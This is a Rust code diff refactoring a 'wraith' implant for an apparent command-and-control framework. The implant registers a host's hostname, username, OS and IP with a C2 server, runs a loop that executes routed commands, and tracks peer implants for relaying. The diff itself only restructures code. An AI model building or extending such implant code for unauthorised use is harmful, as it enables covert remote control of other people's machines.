@@ -1,35 +1,52 @@
-use crate::commands::agent::AgentCommands;
-use crate::commands::relay::RelayCommands;
 use crate::connection::tcp::TcpConnection;
 use crate::message::codec::MessageCodec;
 use crate::proto::wraith::MessageType;
 use crate::relay::RelayManager;
 use crate::wraith::state::WraithState;
-use crate::wraith::tunnel::TunnelManager;
+use crate::wraith::session::{PeerEvent, TunnelManager};
+use crate::commands::agent::AgentCommands;
+use crate::commands::relay::RelayCommands;
 use log::{error, info};
 use std::sync::{Arc, Mutex};
-use std::fmt;
+use tokio::sync::mpsc;
 
-#[derive(Debug)]
+#[derive(Debug, thiserror::Error)]
 pub enum WraithError {
+    #[error("No C2 connection set for wraith!")]
     NoConnection,
+    #[error("{0}")]
     Message(String),
 }
 
-impl fmt::Display for WraithError {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        match self {
-            WraithError::NoConnection => {
-                write!(f, "No C2 connection set for wraith!")
+/// Shared C2 message loop: reads from a connection, dispatches commands via the tunnel manager,
+/// and sends responses back.
+async fn run_c2_message_loop(
+    connection: &mut TcpConnection,
+    tunnel_manager: &Arc<TunnelManager>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    loop {
+        match connection.read_message().await {
+            Ok(msg) => {
+                let msg_type = msg.msg_type;
+                match msg_type {
+                    x if x == MessageType::Command as i32 => {
+                        if let Some(response) = tunnel_manager.route_message(msg).await {
+                            connection.send_message(&response).await?;
+                        }
+                    }
+                    _ => {
+                        info!("Received message type: {}", msg_type);
+                    }
+                }
             }
-            WraithError::Message(msg) => {
-                write!(f, "{msg}")
+            Err(e) => {
+                error!("Read failed: {}", e);
+                break;
             }
         }
     }
+    Ok(())
 }
-
-impl std::error::Error for WraithError {}
 
 pub struct Wraith {
     connection: Option<TcpConnection>,
@@ -43,27 +60,39 @@ pub struct Wraith {
 impl Wraith {
     pub fn new(wraith_id: &String) -> Self {
         let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
-        let state = Arc::new(Mutex::new(WraithState::new_with_relay_manager(
+        let state = Arc::new(Mutex::new(WraithState::new(
             wraith_id.clone(),
             Arc::clone(&relay_manager),
         )));
 
-        // Create single TunnelManager
-        let tunnel_manager = Arc::new(TunnelManager::new());
-        tunnel_manager.set_state(Arc::clone(&state));
+        // Create peer event channel
+        let (peer_event_tx, mut peer_event_rx) = mpsc::channel::<PeerEvent>(100);
+
+        // Create TunnelManager with state injection and peer event channel
+        let tunnel_manager = Arc::new(TunnelManager::new(Arc::clone(&state), peer_event_tx));
 
         // Create commands with reference to tunnel_manager
         let relay_commands = RelayCommands::new(Arc::clone(&relay_manager), Arc::clone(&tunnel_manager));
         let agent_commands = AgentCommands::new(Arc::clone(&tunnel_manager));
 
-        // Configure tunnel_manager with commands
+        // Set commands on tunnel_manager (two-phase init for circular dep)
         tunnel_manager.set_commands(relay_commands, agent_commands);
 
-        // Register peer add callback
-        let state_clone = Arc::clone(&state);
-        tunnel_manager.set_peer_add_callback(move |wraith_id, hostname, sender| {
-            let mut s = state_clone.lock().unwrap();
-            s.add_peer(wraith_id.to_string(), hostname.to_string(), sender.clone());
+        // Spawn task to handle peer events and update state
+        let state_for_events = Arc::clone(&state);
+        tokio::spawn(async move {
+            while let Some(event) = peer_event_rx.recv().await {
+                match event {
+                    PeerEvent::Added { wraith_id, hostname, sender } => {
+                        state_for_events.lock().expect("state lock poisoned")
+                            .add_peer(wraith_id, hostname, sender);
+                    }
+                    PeerEvent::Removed { wraith_id } => {
+                        state_for_events.lock().expect("state lock poisoned")
+                            .remove_peer(&wraith_id);
+                    }
+                }
+            }
         });
 
         Self {
@@ -108,33 +137,13 @@ impl Wraith {
             connection.connect().await?;
         }
 
-        self.state.lock().unwrap().set_connected(true);
+        self.state.lock().expect("state lock poisoned").set_connected(true);
         self.register().await?;
 
         let connection = self.connection.as_mut().ok_or(WraithError::NoConnection)?;
-        loop {
-            match connection.read_message().await {
-                Ok(msg) => {
-                    let msg_type = msg.msg_type;
-                    match msg_type {
-                        x if x == MessageType::Command as i32 => {
-                            if let Some(response) = self.tunnel_manager.route_message(msg, Arc::clone(&self.state)).await {
-                                connection.send_message(&response).await?;
-                            }
-                        }
-                        _ => {
-                            info!("Received message type: {}", msg_type);
-                        }
-                    }
-                }
-                Err(e) => {
-                    error!("Read failed: {}", e);
-                    break;
-                }
-            }
-        }
+        run_c2_message_loop(connection, &self.tunnel_manager).await?;
 
-        self.state.lock().unwrap().set_connected(false);
+        self.state.lock().expect("state lock poisoned").set_connected(false);
         Ok(())
     }
 
@@ -178,13 +187,13 @@ impl Wraith {
     async fn handle_c2_connection(
         stream: tokio::net::TcpStream,
         state: Arc<Mutex<WraithState>>,
-        tunnel_manager: Arc<crate::wraith::tunnel::TunnelManager>,
+        tunnel_manager: Arc<crate::wraith::session::TunnelManager>,
     ) -> Result<(), Box<dyn std::error::Error>> {
         let mut connection = TcpConnection::from_stream(stream);
 
         // Get registration data before locking
         let (hostname, username, os, ip_address) = {
-            let mut s = state.lock().unwrap();
+            let mut s = state.lock().expect("state lock poisoned");
             s.set_connected(true);
             (s.hostname.clone(), s.username.clone(), s.os.clone(), s.ip_address.clone())
         };
@@ -194,29 +203,9 @@ impl Wraith {
         connection.send_message(&msg).await?;
         info!("Registration sent to C2");
 
-        loop {
-            match connection.read_message().await {
-                Ok(msg) => {
-                    let msg_type = msg.msg_type;
-                    match msg_type {
-                        x if x == MessageType::Command as i32 => {
-                            if let Some(response) = tunnel_manager.route_message(msg, Arc::clone(&state)).await {
-                                connection.send_message(&response).await?;
-                            }
-                        }
-                        _ => {
-                            info!("Received message type: {}", msg_type);
-                        }
-                    }
-                }
-                Err(e) => {
-                    error!("Read failed: {}", e);
-                    break;
-                }
-            }
-        }
+        run_c2_message_loop(&mut connection, &tunnel_manager).await?;
 
-        state.lock().unwrap().set_connected(false);
+        state.lock().expect("state lock poisoned").set_connected(false);
         Ok(())
     }
 
@@ -250,7 +239,7 @@ impl Wraith {
 
     async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
         let (hostname, username, os, ip_address) = {
-            let state = self.state.lock().unwrap();
+            let state = self.state.lock().expect("state lock poisoned");
             (state.hostname.clone(), state.username.clone(), state.os.clone(), state.ip_address.clone())
         };
 
@@ -260,18 +249,5 @@ impl Wraith {
             info!("Registration sent");
         }
         Ok(())
-    }
-}
-
-impl Clone for Wraith {
-    fn clone(&self) -> Self {
-        Self {
-            connection: None,
-            state: Arc::clone(&self.state),
-            tunnel_manager: Arc::clone(&self.tunnel_manager),
-            agent_mode: self.agent_mode,
-            peer_listen_addr: self.peer_listen_addr.clone(),
-            peer_connect_addr: self.peer_connect_addr.clone(),
-        }
     }
 }
